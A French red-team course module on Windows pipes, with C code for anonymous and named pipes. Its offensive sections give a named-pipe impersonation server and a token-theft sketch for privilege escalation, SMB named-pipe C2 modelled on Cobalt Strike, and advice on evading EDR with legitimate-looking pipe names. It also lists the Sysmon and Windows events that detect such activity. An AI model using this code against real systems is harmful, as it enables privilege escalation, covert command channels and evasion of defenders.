# Pipes Windows - Communication Inter-Processus

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre les différences entre pipes anonymes et nommés
- [ ] Créer et utiliser des pipes pour l'IPC (Inter-Process Communication)
- [ ] Implémenter un canal C2 via named pipes
- [ ] Manipuler les pipes pour l'impersonation et le privilege escalation
- [ ] Appliquer les techniques OPSEC liées aux pipes

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- Les concepts de processus et threads Windows
- La manipulation de handles Windows
- Les bases de la sécurité Windows (tokens, ACLs)

## Introduction

Les **pipes** sont des mécanismes de communication inter-processus (IPC) permettant à deux processus d'échanger des données. Sous Windows, ils existent sous deux formes : **anonymous pipes** (unidirectionnels) et **named pipes** (bidirectionnels, réseau).

### Pourquoi les pipes sont importants en Red Team ?

Imaginez les pipes comme des **tuyaux virtuels** reliant deux processus :
- **Anonymous Pipes** : Tuyaux simples, parent → enfant (ex: redirection de stdout)
- **Named Pipes** : Tuyaux nommés, accessible par réseau (ex: SMB, C2 local)

**Utilisations offensives** :
- **C2 local** : Communication discrète entre implants sans réseau
- **SMB Beaconing** : C2 via named pipes sur SMB (Cobalt Strike)
- **Token Impersonation** : Voler des tokens via pipes
- **Privilege Escalation** : Exploiter les permissions de pipes mal configurés

## Concepts fondamentaux

### Concept 1 : Anonymous Pipes vs Named Pipes

```
┌────────────────────────────────────────────────────────────────┐
│                      ANONYMOUS PIPES                           │
├────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐         ┌─────────┐         ┌─────────────┐ │
│  │ Parent Proc  │────────▶│  Pipe   │────────▶│ Child Proc  │ │
│  └──────────────┘   Write └─────────┘  Read   └─────────────┘ │
│                                                                │
│  Caractéristiques:                                             │
│  • Unidirectionnel (one-way)                                  │
│  • Pas de nom (handles hérités)                                │
│  • Local uniquement (même machine)                             │
│  • Parent-Child seulement                                      │
│  • Utilisé pour redirection I/O                                │
└────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────┐
│                        NAMED PIPES                             │
├────────────────────────────────────────────────────────────────┤
│  ┌──────────────┐         ┌─────────┐         ┌─────────────┐ │
│  │   Server     │◀───────▶│  Pipe   │◀───────▶│   Client    │ │
│  │   Process    │ Bi-dir  │ (Named) │ Bi-dir  │   Process   │ │
│  └──────────────┘         └─────────┘         └─────────────┘ │
│        ▲                       ▲                               │
│        │                       │                               │
│        │                  Accessible via:                      │
│        │               \\.\pipe\mypipe                         │
│        │         ou \\Server\pipe\mypipe                       │
│        │                                                       │
│  Caractéristiques:                                             │
│  • Bidirectionnel (two-way)                                   │
│  • Nommé (\\.\pipe\name)                                      │
│  • Local ET réseau (via SMB)                                   │
│  • N'importe quels processus                                   │
│  • Utilisé pour IPC, C2, services Windows                      │
└────────────────────────────────────────────────────────────────┘
```

### Concept 2 : Architecture des Named Pipes

```
SERVEUR (Pipe Server)
│
├─ CreateNamedPipe()          # Créer le pipe
│   └─ \\.\pipe\mypipe
│
├─ ConnectNamedPipe()         # Attendre connexion client (bloquant)
│
├─ ReadFile() / WriteFile()   # Communication bidirectionnelle
│
└─ DisconnectNamedPipe()      # Fermer la connexion
   └─ CloseHandle()           # Libérer le handle

────────────────────────────────────────────────

CLIENT (Pipe Client)
│
├─ WaitNamedPipe()            # Attendre que le pipe soit disponible
│
├─ CreateFile()               # Se connecter au pipe
│   └─ \\.\pipe\mypipe
│
├─ ReadFile() / WriteFile()   # Communication bidirectionnelle
│
└─ CloseHandle()              # Fermer la connexion
```

### Concept 3 : Types de Named Pipes

**1. Byte Mode** : Flux continu d'octets (comme TCP)
```c
PIPE_TYPE_BYTE | PIPE_READMODE_BYTE
```

**2. Message Mode** : Messages discrets (comme UDP)
```c
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE
```

### Concept 4 : Permissions et Sécurité

Les pipes ont des ACLs comme les fichiers :

```c
// Pipe accessible par tout le monde (DANGEREUX!)
SECURITY_DESCRIPTOR sd;
InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

SECURITY_ATTRIBUTES sa;
sa.nLength = sizeof(sa);
sa.lpSecurityDescriptor = &sd;
sa.bInheritHandle = FALSE;

// Créer un pipe avec ces permissions
CreateNamedPipe(..., &sa);
```

## Mise en pratique

### Étape 1 : Anonymous Pipe - Redirection I/O

Les anonymous pipes sont utilisés pour rediriger stdin/stdout/stderr :

```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};  // Héritabilité
    char buffer[4096];
    DWORD bytesRead;

    // Créer un anonymous pipe
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        printf("[-] CreatePipe failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Anonymous pipe created\n");
    printf("[+] Read handle: %p\n", hReadPipe);
    printf("[+] Write handle: %p\n", hWritePipe);

    // Créer un processus enfant avec stdout redirigé
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;   // Rediriger stdout vers le pipe
    si.hStdError = hWritePipe;    // Rediriger stderr vers le pipe
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    // Lancer cmd.exe avec output redirigé
    if (!CreateProcessA(
            NULL,
            "cmd.exe /c dir C:\\",
            NULL, NULL, TRUE,     // TRUE = hériter les handles
            0, NULL, NULL,
            &si, &pi)) {
        printf("[-] CreateProcess failed\n");
        return 1;
    }

    printf("[+] Child process created (PID: %lu)\n", pi.dwProcessId);

    // Fermer le handle d'écriture côté parent (seul l'enfant écrit)
    CloseHandle(hWritePipe);

    // Lire l'output du processus enfant
    printf("[+] Reading output from child process:\n");
    printf("----------------------------------------\n");

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        printf("%s", buffer);
    }

    printf("----------------------------------------\n");

    // Nettoyage
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

### Étape 2 : Named Pipe - Serveur

Créer un serveur de pipe nommé :

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\mypipe"
#define BUFFER_SIZE 4096

int main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;

    printf("[*] Creating named pipe: %s\n", PIPE_NAME);

    // Créer le named pipe
    hPipe = CreateNamedPipeA(
        PIPE_NAME,                           // Nom du pipe
        PIPE_ACCESS_DUPLEX,                  // Lecture + Écriture
        PIPE_TYPE_MESSAGE |                  // Mode message
        PIPE_READMODE_MESSAGE |
        PIPE_WAIT,                           // Bloquant
        PIPE_UNLIMITED_INSTANCES,            // Nombre d'instances max
        BUFFER_SIZE,                         // Output buffer size
        BUFFER_SIZE,                         // Input buffer size
        0,                                   // Timeout (0 = défaut)
        NULL                                 // Security attributes
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Named pipe created successfully\n");
    printf("[+] Waiting for client connection...\n");

    // Attendre qu'un client se connecte
    if (!ConnectNamedPipe(hPipe, NULL)) {
        DWORD error = GetLastError();
        if (error != ERROR_PIPE_CONNECTED) {
            printf("[-] ConnectNamedPipe failed: %lu\n", error);
            CloseHandle(hPipe);
            return 1;
        }
    }

    printf("[+] Client connected!\n");

    // Boucle de communication
    while (1) {
        // Lire le message du client
        if (!ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
            printf("[-] ReadFile failed: %lu\n", GetLastError());
            break;
        }

        if (bytesRead == 0) {
            printf("[*] Client disconnected\n");
            break;
        }

        buffer[bytesRead] = '\0';
        printf("[+] Received: %s\n", buffer);

        // Envoyer une réponse
        const char *response = "Message received!";
        if (!WriteFile(hPipe, response, strlen(response), &bytesWritten, NULL)) {
            printf("[-] WriteFile failed: %lu\n", GetLastError());
            break;
        }
    }

    // Nettoyage
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    return 0;
}
```

### Étape 3 : Named Pipe - Client

Se connecter à un pipe nommé :

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\mypipe"
#define BUFFER_SIZE 4096

int main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;

    printf("[*] Connecting to pipe: %s\n", PIPE_NAME);

    // Attendre que le pipe soit disponible
    if (!WaitNamedPipeA(PIPE_NAME, NMPWAIT_WAIT_FOREVER)) {
        printf("[-] WaitNamedPipe failed: %lu\n", GetLastError());
        return 1;
    }

    // Se connecter au pipe
    hPipe = CreateFileA(
        PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Connected to pipe!\n");

    // Passer en mode message
    DWORD mode = PIPE_READMODE_MESSAGE;
    if (!SetNamedPipeHandleState(hPipe, &mode, NULL, NULL)) {
        printf("[-] SetNamedPipeHandleState failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    // Envoyer un message
    const char *message = "Hello from client!";
    printf("[*] Sending: %s\n", message);

    if (!WriteFile(hPipe, message, strlen(message), &bytesWritten, NULL)) {
        printf("[-] WriteFile failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    // Recevoir la réponse
    if (!ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        printf("[-] ReadFile failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    buffer[bytesRead] = '\0';
    printf("[+] Received: %s\n", buffer);

    CloseHandle(hPipe);
    return 0;
}
```

### Étape 4 : Named Pipe sur le réseau (SMB)

Les pipes peuvent être accessibles via SMB :

```c
// Serveur (sur machine A)
CreateNamedPipeA("\\\\.\\pipe\\c2channel", ...);

// Client (sur machine B)
CreateFileA("\\\\192.168.1.100\\pipe\\c2channel", ...);
```

**Schéma** :
```
┌─────────────────┐                      ┌─────────────────┐
│  Machine A      │                      │  Machine B      │
│  192.168.1.100  │                      │  192.168.1.50   │
│                 │                      │                 │
│  Pipe Server    │                      │  Pipe Client    │
│  \\.\pipe\c2    │◀──── SMB (445) ─────│  CreateFile()   │
│                 │                      │  \\A\pipe\c2    │
└─────────────────┘                      └─────────────────┘
```

### Étape 5 : Impersonation via Pipes

Les pipes permettent de voler des tokens via `ImpersonateNamedPipeClient()` :

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\impersonate_pipe"

void PrintCurrentUser() {
    HANDLE hToken;
    char username[256];
    DWORD usernameLen = sizeof(username);

    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    GetUserNameA(username, &usernameLen);
    printf("[*] Current user: %s\n", username);
    CloseHandle(hToken);
}

int main() {
    HANDLE hPipe;

    // Créer un pipe avec permissions permissives
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);  // Everyone

    SECURITY_ATTRIBUTES sa = {sizeof(sa), &sd, FALSE};

    hPipe = CreateNamedPipeA(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 4096, 4096, 0,
        &sa
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed\n");
        return 1;
    }

    printf("[+] Pipe created: %s\n", PIPE_NAME);
    printf("[+] Waiting for client...\n");

    PrintCurrentUser();

    // Attendre connexion
    ConnectNamedPipe(hPipe, NULL);

    printf("[+] Client connected!\n");

    // Impersonate le client
    if (ImpersonateNamedPipeClient(hPipe)) {
        printf("[+] Impersonation successful!\n");
        PrintCurrentUser();  // Affichera l'utilisateur du client

        // Revenir au contexte original
        RevertToSelf();
    } else {
        printf("[-] ImpersonateNamedPipeClient failed: %lu\n", GetLastError());
    }

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    return 0;
}
```

**Client (se connecter depuis un compte admin)** :
```c
int main() {
    HANDLE hPipe = CreateFileA(
        PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );

    if (hPipe != INVALID_HANDLE_VALUE) {
        printf("[+] Connected to pipe\n");
        Sleep(5000);  // Laisser le serveur nous impersonate
        CloseHandle(hPipe);
    }

    return 0;
}
```

## Application offensive

### Contexte Red Team

**1. C2 via Named Pipes (SMB Beaconing)**

Cobalt Strike utilise les pipes pour le C2 interne :

```c
// Implant 1 (Pipe Server) : Machine compromise avec accès Internet
HANDLE hPipe = CreateNamedPipeA(
    "\\\\.\\pipe\\msagent_12",
    PIPE_ACCESS_DUPLEX,
    PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
    PIPE_UNLIMITED_INSTANCES,
    8192, 8192, 0, NULL
);

// Relayer les commandes entre le C2 externe et les implants internes

// Implant 2 (Pipe Client) : Machine isolée (pas d'accès Internet)
HANDLE hPipe = CreateFileA(
    "\\\\beacon1\\pipe\\msagent_12",
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, 0, NULL
);
// Recevoir des commandes via le pipe au lieu du réseau
```

**Avantages** :
- Pas de connexion réseau directe (moins suspect)
- Fonctionne sur machines isolées
- Utilise SMB (trafic légitime)

**2. Token Theft via Pipe Impersonation**

```c
// Technique classique pour privilege escalation
// 1. Créer un pipe avec DACL permissif
// 2. Attendre qu'un processus privilégié se connecte
// 3. Impersonate le client
// 4. Créer un nouveau processus avec le token volé

HANDLE hPipe = CreateNamedPipeA(
    "\\\\.\\pipe\\legitimate_service",  // Nom qui attire les admins
    PIPE_ACCESS_DUPLEX,
    PIPE_TYPE_MESSAGE | PIPE_WAIT,
    1, 0, 0, 0,
    &permissiveSA
);

ConnectNamedPipe(hPipe, NULL);

if (ImpersonateNamedPipeClient(hPipe)) {
    // Obtenir le token du client
    HANDLE hToken;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);

    // Créer un processus avec ce token
    CreateProcessAsUser(hToken, ...);
}
```

**3. Communication discrète entre implants**

```c
// Pipe local pour éviter le trafic réseau
// Implant A (keylogger) → Pipe → Implant B (exfiltration)

// Avantages:
// - Pas de socket réseau (pas détecté par netstat)
// - Pas de fichier temporaire (moins d'artefacts)
// - Rapide et efficace
```

### Considérations OPSEC

**1. Détection**

Les pipes sont surveillés par les EDR :

```powershell
# Lister les pipes actifs
Get-ChildItem \\.\pipe\

# Surveiller les nouvelles créations de pipes (Sysmon Event ID 17/18)
```

**2. Techniques d'évasion**

```c
// A. Utiliser des noms légitimes
// MAUVAIS: \\.\pipe\evil_c2_channel
// BON: \\.\pipe\mojo.{PID}.{RAND}  (Chrome utilise ce format)

// B. Permissions restreintes (éviter Everyone)
EXPLICIT_ACCESS ea;
ea.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE;
ea.grfAccessMode = SET_ACCESS;
ea.grfInheritance = NO_INHERITANCE;
ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
ea.Trustee.ptstrName = "NT AUTHORITY\\SYSTEM";

PACL pACL = NULL;
SetEntriesInAcl(1, &ea, NULL, &pACL);

SECURITY_DESCRIPTOR sd;
InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
SetSecurityDescriptorDacl(&sd, TRUE, pACL, FALSE);

// C. Nettoyer après utilisation
DisconnectNamedPipe(hPipe);
CloseHandle(hPipe);

// D. Randomiser les noms
char pipeName[256];
GUID guid;
CoCreateGuid(&guid);
sprintf(pipeName, "\\\\.\\pipe\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
        guid.Data1, guid.Data2, guid.Data3, ...);
```

**3. Logs générés**

- **Sysmon Event ID 17** : Pipe created
- **Sysmon Event ID 18** : Pipe connected
- **Windows Event ID 5145** : Network share access (SMB pipes)

**4. Named Pipes vs Autres IPC**

| Méthode IPC | Visibilité Réseau | OPSEC | Performance |
|-------------|-------------------|-------|-------------|
| **Named Pipes** | Visible via SMB | Moyenne | Haute |
| **Mailslots** | Visible | Faible | Basse |
| **Shared Memory** | Invisible | Haute | Très haute |
| **TCP Sockets** | Visible (netstat) | Faible | Haute |

## Résumé

- **Anonymous Pipes** : Unidirectionnels, parent-child, redirection I/O
- **Named Pipes** : Bidirectionnels, nommés, local + réseau (SMB)
- **IPC** : Communication inter-processus sans réseau
- **Impersonation** : Voler des tokens via `ImpersonateNamedPipeClient()`
- **C2** : SMB beaconing pour machines isolées (Cobalt Strike)
- **OPSEC** : Noms légitimes, permissions strictes, nettoyage, monitoring EDR
- **Détection** : Sysmon Event ID 17/18, analyse des pipes actifs

## Ressources complémentaires

- [Microsoft Named Pipes Documentation](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)
- [Cobalt Strike SMB Beacon](https://www.cobaltstrike.com/help-smb-beacon)
- [MITRE ATT&CK T1055.012 - Process Injection: Named Pipe Impersonation](https://attack.mitre.org/techniques/T1055/012/)
- [Token Impersonation via Named Pipes](https://github.com/decoder-it/pipeserverimpersonate)
- [Pipe Hunting with Sysmon](https://www.ired.team/offensive-security/code-execution/named-pipe-impersonation)

---

**Navigation**
- [Module précédent](../07-Reseau-Winsock/)
- [Module suivant](../09-Tokens-Privileges/)
